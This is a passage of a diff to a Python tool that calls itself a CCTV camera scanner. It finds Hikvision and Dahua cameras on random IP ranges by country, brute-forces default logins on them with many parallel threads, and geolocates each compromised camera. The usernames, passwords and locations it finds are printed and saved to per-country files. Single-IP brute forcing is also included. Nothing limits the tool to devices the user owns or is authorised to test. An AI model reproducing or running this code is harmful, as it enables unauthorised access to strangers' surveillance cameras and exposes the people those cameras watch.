+                    return location_info
     except Exception:
         pass
     
+    # Fallback: Try ipapi.co (secondary service)
     try:
         response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=8)
         if response.status_code == 200:
@@ -1376,7 +1479,29 @@ def get_geographic_location(ip: str) -> dict:
                 location_info['region'] = data.get('region', 'Unknown')
                 location_info['city'] = data.get('city', 'Unknown')
                 location_info['postal_code'] = data.get('postal', 'Unknown')
-                return location_info
+                
+                # If we got valid data, return it
+                if location_info['country'] != 'Unknown':
+                    return location_info
+    except Exception:
+        pass
+    
+    # Fallback: Try ipinfo.io (tertiary service)
+    try:
+        response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=8)
+        if response.status_code == 200:
+            data = response.json()
+            if not data.get('error'):
+                # Parse location string (format: "City, Region, Country")
+                loc = data.get('loc', '').split(',')
+                location_info['country'] = data.get('country', 'Unknown')
+                location_info['region'] = data.get('region', 'Unknown')
+                location_info['city'] = data.get('city', 'Unknown')
+                location_info['postal_code'] = data.get('postal', 'Unknown')
+                
+                # If we got valid data, return it
+                if location_info['country'] != 'Unknown':
+                    return location_info
     except Exception:
         pass
     
@@ -1384,10 +1509,14 @@ def get_geographic_location(ip: str) -> dict:
 
 
 def find_cctv_files() -> List[str]:
-    """Auto-find all CCTV Found files (*_CCTV_Found.txt)"""
+    """
+    Auto-find all CCTV Found files (*_CCTV_Found.txt) in script directory
+    Returns list of file paths
+    """
     cctv_files = []
     
     try:
+        # Search in script directory
         for file in os.listdir(SCRIPT_DIR):
             if file.endswith('_CCTV_Found.txt'):
                 file_path = os.path.join(SCRIPT_DIR, file)
@@ -1396,14 +1525,30 @@ def find_cctv_files() -> List[str]:
     except Exception:
         pass
     
+    # Also check current directory
+    try:
+        current_dir = os.getcwd()
+        if current_dir != SCRIPT_DIR:
+            for file in os.listdir(current_dir):
+                if file.endswith('_CCTV_Found.txt'):
+                    file_path = os.path.join(current_dir, file)
+                    if os.path.isfile(file_path) and file_path not in cctv_files:
+                        cctv_files.append(file_path)
+    except Exception:
+        pass
+    
     return sorted(cctv_files)
 
 
 def find_valid_camera_files() -> List[str]:
-    """Auto-find all ValidCamera files (*ValidCamera.txt)"""
+    """
+    Auto-find all ValidCamera files (CountryValidCamera.txt) in script directory
+    Returns list of file paths
+    """
     valid_files = []
     
     try:
+        # Search in script directory
         for file in os.listdir(SCRIPT_DIR):
             if file.endswith('ValidCamera.txt'):
                 file_path = os.path.join(SCRIPT_DIR, file)
@@ -1412,11 +1557,25 @@ def find_valid_camera_files() -> List[str]:
     except Exception:
         pass
     
+    # Also check current directory
+    try:
+        current_dir = os.getcwd()
+        if current_dir != SCRIPT_DIR:
+            for file in os.listdir(current_dir):
+                if file.endswith('ValidCamera.txt'):
+                    file_path = os.path.join(current_dir, file)
+                    if os.path.isfile(file_path) and file_path not in valid_files:
+                        valid_files.append(file_path)
+    except Exception:
+        pass
+    
     return sorted(valid_files)
 
 
 def view_valid_cameras(file_path: str):
-    """Parse and display valid cameras from ValidCamera.txt file"""
+    """
+    Parse and display valid cameras from ValidCamera.txt file
+    """
     try:
         if not os.path.exists(file_path):
             print(f"{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
@@ -1425,6 +1584,7 @@ def view_valid_cameras(file_path: str):
         with open(file_path, 'r', encoding='utf-8') as f:
             content = f.read()
         
+        # Split by separator
         sections = content.split('=' * 60)
         
         cameras = []
@@ -1433,6 +1593,7 @@ def view_valid_cameras(file_path: str):
         for section in sections:
             lines = [line.strip() for line in section.split('\n') if line.strip()]
             
+            # Check if this is the summary section
             if 'Valid Camera Count Summary' in section:
                 for line in lines:
                     if 'Total Valid Camera Count:' in line:
@@ -1467,13 +1628,15 @@ def view_valid_cameras(file_path: str):
             if 'ip' in camera_info:
                 cameras.append(camera_info)
         
+        # Display results
         print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}Valid Cameras - {os.path.basename(file_path)}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
         
+        # Show summary if available
         if summary_info:
             print(f"{Fore.YELLOW}Summary:{Style.RESET_ALL}")
-            print(f"  Total: {Fore.GREEN}{summary_info.get('total', 'N/A')}{Style.RESET_ALL}")
+            print(f"  Total Valid Camera Count: {Fore.GREEN}{summary_info.get('total', 'N/A')}{Style.RESET_ALL}")
             print(f"  Anjhua-Dahua: {Fore.CYAN}{summary_info.get('dahua', 'N/A')}{Style.RESET_ALL}")
             print(f"  HIK Vision: {Fore.CYAN}{summary_info.get('hikvision', 'N/A')}{Style.RESET_ALL}\n")
         
@@ -1483,12 +1646,14 @@ def view_valid_cameras(file_path: str):
         
         print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Found {Fore.YELLOW}{len(cameras)}{Style.RESET_ALL} valid cameras\n")
         
+        # Display cameras
         for i, camera in enumerate(cameras, 1):
             print(f"{Fore.CYAN}[{i}] {camera.get('ip', 'Unknown')}:{camera.get('port', 'Unknown')}{Style.RESET_ALL}")
-            print(f"    Type: {Fore.YELLOW}{camera.get('camera_type', 'Unknown')}{Style.RESET_ALL}")
+            print(f"    Camera Type: {Fore.YELLOW}{camera.get('camera_type', 'Unknown')}{Style.RESET_ALL}")
             print(f"    Username: {Fore.GREEN}{camera.get('username', 'Unknown')}{Style.RESET_ALL}")
             print(f"    Password: {Fore.GREEN}{camera.get('password', 'Unknown')}{Style.RESET_ALL}")
-            print(f"    Location: {camera.get('city', 'Unknown')}, {camera.get('region', 'Unknown')}, {camera.get('country', 'Unknown')}\n")
+            print(f"    Location: {camera.get('city', 'Unknown')}, {camera.get('region', 'Unknown')}, {camera.get('country', 'Unknown')}")
+            print()
         
         print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
         
@@ -1497,7 +1662,10 @@ def view_valid_cameras(file_path: str):
 
 
 def parse_cctv_file(file_path: str) -> List[dict]:
-    """Parse CCTV Found file and extract camera information"""
+    """
+    Parse CCTV Found file and extract camera information
+    Returns list of camera dictionaries with ip, camera_type, port
+    """
     cameras = []
     
     try:
@@ -1508,6 +1676,7 @@ def parse_cctv_file(file_path: str) -> List[dict]:
         with open(file_path, 'r', encoding='utf-8') as f:
             content = f.read()
         
+        # Split by separator
         sections = content.split('=' * 60)
         
         for section in sections:
@@ -1537,39 +1706,40 @@ def parse_cctv_file(file_path: str) -> List[dict]:
 def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], max_workers: int = None):
     """
     Phase 2: Read saved cameras from file and try login credentials
+    Saves valid logins to ValidCamera.txt with geographic information
     """
-    global valid_results, start_time, found_count, rejected_count, login_success_count
-    
-    found_count = 0
-    rejected_count = 0
-    login_success_count = 0
+    global valid_results, start_time
     
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[*] Login Check from Saved Cameras{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[*] Login Check - Brute Force from Saved Cameras{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[*] File: {file_path}{Style.RESET_ALL}\n")
+    print(f"{Fore.YELLOW}[*] Reading cameras from: {file_path}{Style.RESET_ALL}\n")
     
+    # Parse cameras from file
     cameras = parse_cctv_file(file_path)
     
     if not cameras:
         print(f"{Fore.RED}[!] No cameras found in file!{Style.RESET_ALL}")
         return
     
+    # Extract country code from file name (e.g., BD_CCTV_Found.txt -> BD)
     file_name = os.path.basename(file_path)
-    country_code = "Valid"
+    country_code = "Valid"  # Default if no country code found
     if '_CCTV_Found.txt' in file_name:
         country_code = file_name.replace('_CCTV_Found.txt', '')
     
+    # Valid camera output file with country code
     valid_output_file = os.path.join(SCRIPT_DIR, f"{country_code}ValidCamera.txt")
     
-    print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Found {Fore.YELLOW}{len(cameras)}{Style.RESET_ALL} cameras")
-    print(f"{Fore.YELLOW}[*] Credentials: {len(credentials)}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[*] Output: {valid_output_file}{Style.RESET_ALL}\n")
+    print(f"{Fore.GREEN}[{Fore.YELLOW}✓{Fore.GREEN}] {Fore.CYAN}Found {Fore.YELLOW}{len(cameras)}{Fore.CYAN} cameras in file{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[*] Credentials to try: {len(credentials)}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[*] Valid logins will be saved to: {valid_output_file}{Style.RESET_ALL}\n")
     
+    # Auto-detect CPU cores
     if max_workers is None:
         try:
             cpu_count = os.cpu_count() or 4
-            max_workers = min(cpu_count * 10, 200)
+            max_workers = min(cpu_count * 10, 200)  # Less threads for login attempts
         except:
             max_workers = 100
     
@@ -1578,14 +1748,17 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
     start_time = time.time()
     valid_results.clear()
     
+    # Clear/create valid camera output file
     try:
         if os.path.exists(valid_output_file):
+            # Clear file first
             with open(valid_output_file, 'w', encoding='utf-8') as f:
-                pass
+                pass  # Clear file
     except:
         pass
     
     def try_login_on_camera(camera_info: dict) -> Optional[dict]:
+        """Try login credentials on a single camera"""
         ip = camera_info.get('ip')
         port = camera_info.get('port', 80)
         camera_type = camera_info.get('camera_type', '')
@@ -1594,6 +1767,7 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
         if not ip:
             return None
         
+        # Determine validator based on camera type
         is_dahua = "Dahua" in camera_type or "Anjhua" in camera_type
         
         for username, password in credentials:
@@ -1601,14 +1775,16 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
                 if is_dahua:
                     validator = DahuaCameraValidator(ip, username, password, port)
                 else:
+                    # Try Hikvision first
                     validator = HikvisionCameraValidator(ip, username, password, port)
                 
-                validator.timeout = 2.0
+                validator.timeout = 2.0  # Slightly longer timeout for login
                 success, message = validator.validate()
                 
                 if success:
-                    print(f"\n{Fore.GREEN}[✓] LOGIN SUCCESS! {ip}:{port} | {username}:{password}{Style.RESET_ALL}")
-                    time.sleep(0.1)
+                    print(f"{Fore.GREEN}[✓] LOGIN SUCCESS!{Style.RESET_ALL} {ip}:{port} - {username}:{password}")
+                    # Get geographic location (with small delay to avoid rate limiting)
+                    time.sleep(0.1)  # Small delay to avoid rate limiting
                     geo_info = get_geographic_location(ip)
                     return {
                         'ip': ip,
@@ -1621,6 +1797,7 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
                         'geo': geo_info
                     }
                 
+                # If Hikvision failed and it's not Dahua, try Dahua as fallback
                 if not is_dahua:
                     validator = DahuaCameraValidator(ip, username, password, port)
                     validator.timeout = 2.0
@@ -1628,8 +1805,9 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
                     
                     if success:
                         camera_type = "Anjhua-Dahua Technology Camera"
-                        print(f"\n{Fore.GREEN}[✓] LOGIN SUCCESS! {ip}:{port} | {username}:{password}{Style.RESET_ALL}")
-                        time.sleep(0.1)
+                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS!{Style.RESET_ALL} {ip}:{port} - {username}:{password}")
+                        # Get geographic location (with small delay to avoid rate limiting)
+                        time.sleep(0.1)  # Small delay to avoid rate limiting
                         geo_info = get_geographic_location(ip)
                         return {
                             'ip': ip,
@@ -1647,20 +1825,22 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
         
         return None
     
+    # Use ThreadPoolExecutor for parallel login attempts
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         future_to_camera = {
             executor.submit(try_login_on_camera, camera): camera 
             for camera in cameras
         }
         
+        # Process results as they complete
         for future in as_completed(future_to_camera):
             try:
                 result = future.result()
                 if result:
                     with results_lock:
                         valid_results.append(result)
-                        login_success_count += 1
                     
+                    # Save valid login to file immediately
                     try:
                         geo = result.get('geo', {})
                         camera_type = result['camera_type']
@@ -1684,6 +1864,7 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
             except Exception:
                 pass
     
+    # Calculate final counts
     final_counts = {
         'Anjhua-Dahua Technology Camera': 0,
         'HIK Vision Camera': 0,
@@ -1696,10 +1877,12 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
         elif 'HIK' in camera_type or 'Hikvision' in camera_type:
             final_counts['HIK Vision Camera'] += 1
     
+    # Add summary header to file
     try:
         with open(valid_output_file, 'r', encoding='utf-8') as f:
             content = f.read()
         
+        # Create summary header
         summary_header = f"{'='*60}\n"
         summary_header += f"Valid Camera Count Summary\n"
         summary_header += f"{'='*60}\n"
@@ -1708,19 +1891,78 @@ def brute_force_from_file(file_path: str, credentials: List[Tuple[str, str]], ma
         summary_header += f"HIK Vision: {final_counts['HIK Vision Camera']}\n"
         summary_header += f"{'='*60}\n\n"
         
+        # Prepend summary to content
         with open(valid_output_file, 'w', encoding='utf-8') as f:
             f.write(summary_header + content)
     except Exception:
         pass
     
+    # Print summary
     elapsed = time.time() - start_time
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[✓] Login Check Complete!{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"Checked: {len(cameras)} cameras")
-    print(f"Valid: {Fore.GREEN}{len(valid_results)}{Style.RESET_ALL}")
-    print(f"Time: {elapsed:.2f}s")
-    print(f"Saved to: {Fore.YELLOW}{valid_output_file}{Style.RESET_ALL}\n")
+    print(f"Total cameras checked: {len(cameras)}")
+    print(f"Time elapsed: {elapsed:.2f} seconds")
+    print(f"Valid credentials found: {Fore.GREEN}{len(valid_results)}{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}Camera Type Breakdown:{Style.RESET_ALL}")
+    print(f"  Anjhua-Dahua: {Fore.YELLOW}{final_counts['Anjhua-Dahua Technology Camera']}{Style.RESET_ALL}")
+    print(f"  HIK Vision: {Fore.YELLOW}{final_counts['HIK Vision Camera']}{Style.RESET_ALL}")
+    print(f"Valid logins saved to: {Fore.YELLOW}{valid_output_file}{Style.RESET_ALL}\n")
+    
+    if valid_results:
+        print(f"{Fore.GREEN}✓ VALID CREDENTIALS FOUND:{Style.RESET_ALL}\n")
+        for i, result in enumerate(valid_results, 1):
+            geo = result.get('geo', {})
+            print(f"{Fore.CYAN}[{i}] IP: {result['ip']}{Style.RESET_ALL}")
+            print(f"    Type: {result['camera_type']}")
+            print(f"    Username: {Fore.GREEN}{result['username']}{Style.RESET_ALL}")
+            print(f"    Password: {Fore.GREEN}{result['password']}{Style.RESET_ALL}")
+            print(f"    Port: {result['port']}")
+            print(f"    URL: {result['url']}")
+            print(f"    Location: {geo.get('city', 'Unknown')}, {geo.get('region', 'Unknown')}, {geo.get('country', 'Unknown')}")
+            print(f"    Status: {result['message']}\n")
+    else:
+        print(f"{Fore.RED}✗ No valid credentials found{Style.RESET_ALL}\n")
+
+
+def brute_force_single_ip(ip: str, credentials: List[Tuple[str, str]], port: int = None):
+    """Brute force single IP"""
+    global valid_results
+    
+    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}🔐 BruteForce Single IP - Camera Login Checker{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
+    print(f"{Fore.YELLOW}[*] Target IP: {ip}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[*] Credentials to try: {len(credentials)}{Style.RESET_ALL}\n")
+    
+    # Try direct connection
+    print(f"{Fore.CYAN}[*] Trying credentials...{Style.RESET_ALL}")
+    for username, password in credentials:
+        # Try Hikvision
+        validator = HikvisionCameraValidator(ip, username, password, port or 80)
+        success, message = validator.validate()
+        if success:
+            print(f"{Fore.GREEN}[+] SUCCESS: {message}{Style.RESET_ALL}")
+            result = {'ip': ip, 'username': username, 'password': password, 
+                     'camera_type': 'HIK Vision Camera', 'port': port or 80, 'message': message}
+            valid_results.append(result)
+            print(f"{Fore.GREEN}✓ Found valid credentials: {username}:{password}{Style.RESET_ALL}\n")
+            return result
+        
+        # Try Dahua
+        validator = DahuaCameraValidator(ip, username, password, port or 80)
+        success, message = validator.validate()
+        if success:
+            print(f"{Fore.GREEN}[+] SUCCESS: {message}{Style.RESET_ALL}")
+            result = {'ip': ip, 'username': username, 'password': password, 
+                     'camera_type': 'Anjhua-Dahua Technology Camera', 'port': port or 80, 'message': message}
+            valid_results.append(result)
+            print(f"{Fore.GREEN}✓ Found valid credentials: {username}:{password}{Style.RESET_ALL}\n")
+            return result
+    
+    print(f"{Fore.RED}[-] No valid credentials found{Style.RESET_ALL}\n")
+    return None
 
 
 def get_public_ip():
@@ -1729,9 +1971,10 @@ def get_public_ip():
         response = requests.get('https://api.ipify.org', timeout=5)
         if response.status_code == 200:
             return response.text
-    except Exception:
-        pass
-    return "Unknown"
+        else:
+            return "Unknown"
+    except Exception as e:
+        return "Unknown"
 
 
 def get_country(ip):
@@ -1741,15 +1984,17 @@ def get_country(ip):
         if response.status_code == 200:
             data = response.json()
             return data.get('country', 'Unknown')
-    except Exception:
-        pass
-    return "Unknown"
+        else:
+            return "Unknown"
+    except Exception as e:
+        return "Unknown"
 
 
 def print_banner():
     print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}        CCTV Camera Scanner - Hikvision & Dahua/Anjhua{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[*] Developed by: {Fore.YELLOW}Charlie{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[*] Supports: {Fore.YELLOW}Hikvision & Dahua/Anjhua Cameras{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
 
@@ -1758,21 +2003,25 @@ def main():
     """Main function with menu"""
     global start_time, scanned_count, total_ips, valid_results
     
+    # Print banner
     print_banner()
     
+    # Display system info
     try:
         public_ip = get_public_ip()
         country = get_country(public_ip)
         timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
-        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} IP: {Fore.YELLOW}{public_ip}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Your IP: {Fore.YELLOW}{public_ip}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Country: {Fore.YELLOW}{country}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Time: {Fore.YELLOW}{timestamp}{Style.RESET_ALL}")
     except:
         pass
     
+    # Print menu
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}Main Menu:{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    
     print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Random Camera Scan")
     print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Login Check from Saved TXT File")
     print(f"{Fore.YELLOW}3.{Style.RESET_ALL} IP Range Scan")
@@ -1782,6 +2031,7 @@ def main():
     choice = input(f"{Fore.GREEN}Enter your choice (1-4):{Style.RESET_ALL} ").strip()
     
     if choice == '1':
+        # Random Camera Scan - Phase 1
         print_country_menu()
         
         while True:
@@ -1790,9 +2040,11 @@ def main():
             if country_choice in COUNTRIES:
                 selected_country = COUNTRIES[country_choice]
                 print(f"\n{Fore.GREEN}[✓] Selected: {Fore.YELLOW}{selected_country['name']}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}[i] Code: {selected_country['code']}{Style.RESET_ALL}\n")
+                print(f"{Fore.CYAN}[i] Country Code: {selected_country['code']}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[i] IP File: {selected_country['file']}{Style.RESET_ALL}\n")
                 
-                print(f"{Fore.CYAN}[*] Select mode:{Style.RESET_ALL}")
+                # Ask if user wants to try login or just detect
+                print(f"{Fore.CYAN}[*] Select scan mode:{Style.RESET_ALL}")
                 print(f"  {Fore.YELLOW}1.{Style.RESET_ALL} Detection Only (Fast)")
                 print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} Detection + Login Attempt")
                 
@@ -1807,6 +2059,8 @@ def main():
                 print(f"{Fore.RED}[!] Invalid choice. Please select 1-{len(COUNTRIES)}.{Style.RESET_ALL}")
     
     elif choice == '2':
+        # Login Check from Saved TXT File - Phase 2
+        # Auto-find CCTV Found files
         cctv_files = find_cctv_files()
         
         if not cctv_files:
@@ -1814,11 +2068,13 @@ def main():
             print(f"{Fore.YELLOW}[*] Please run option 1 first to detect cameras.{Style.RESET_ALL}")
             sys.exit(1)
         
+        # Show all found files
         print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}Available CCTV Found Files:{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
         for i, file_path in enumerate(cctv_files, 1):
             file_name = os.path.basename(file_path)
+            # Get file size
             try:
                 file_size = os.path.getsize(file_path)
                 file_size_kb = file_size / 1024
@@ -1827,6 +2083,7 @@ def main():
                 print(f"{Fore.YELLOW}  {i}.{Style.RESET_ALL} {file_name}")
         print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
         
+        # Let user select or auto-select if only one file
         if len(cctv_files) == 1:
             file_path = cctv_files[0]
             print(f"{Fore.GREEN}[*] Auto-selected: {os.path.basename(file_path)}{Style.RESET_ALL}\n")
@@ -1843,9 +2100,11 @@ def main():
                 except ValueError:
                     print(f"{Fore.RED}[!] Invalid input. Please enter a number.{Style.RESET_ALL}")
         
-        brute_force_from_file(file_path, DEFAULT_CREDENTIALS)
+        credentials = DEFAULT_CREDENTIALS
+        brute_force_from_file(file_path, credentials)
     
     elif choice == '3':
+        # IP Range input
         start_ip = input(f"{Fore.GREEN}[*] Enter Start IP:{Style.RESET_ALL} ").strip()
         if not start_ip:
             print(f"{Fore.RED}[!] Start IP is required!{Style.RESET_ALL}")
@@ -1856,10 +2115,13 @@ def main():
             print(f"{Fore.RED}[!] End IP is required!{Style.RESET_ALL}")
             sys.exit(1)
         
+        credentials = DEFAULT_CREDENTIALS
         print()
-        scan_ip_range(start_ip, end_ip, DEFAULT_CREDENTIALS)
+        scan_ip_range(start_ip, end_ip, credentials)
     
     elif choice == '4':
+        # View All Valid Camera
+        # Auto-find ValidCamera files
         valid_files = find_valid_camera_files()
         
         if not valid_files:
@@ -1867,11 +2129,13 @@ def main():
             print(f"{Fore.YELLOW}[*] Please run option 2 first to check login on cameras.{Style.RESET_ALL}")
             sys.exit(1)
         
+        # Show all found files
         print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}Available ValidCamera Files:{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
         for i, file_path in enumerate(valid_files, 1):
             file_name = os.path.basename(file_path)
+            # Get file size
             try:
                 file_size = os.path.getsize(file_path)
                 file_size_kb = file_size / 1024
@@ -1880,6 +2144,7 @@ def main():
                 print(f"{Fore.YELLOW}  {i}.{Style.RESET_ALL} {file_name}")
         print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
         
+        # Let user select or auto-select if only one file
         if len(valid_files) == 1:
             file_path = valid_files[0]
             print(f"{Fore.GREEN}[*] Auto-selected: {os.path.basename(file_path)}{Style.RESET_ALL}\n")
@@ -1897,11 +2162,12 @@ def main():
                     print(f"{Fore.RED}[!] Invalid input. Please enter a number.{Style.RESET_ALL}")
         
         view_valid_cameras(file_path)
-    
+        
     else:
         print(f"{Fore.RED}[!] Invalid choice!{Style.RESET_ALL}")
         sys.exit(1)
     
+    # Summary is handled within each function, so we don't need a global summary here
     sys.exit(0)
 
 
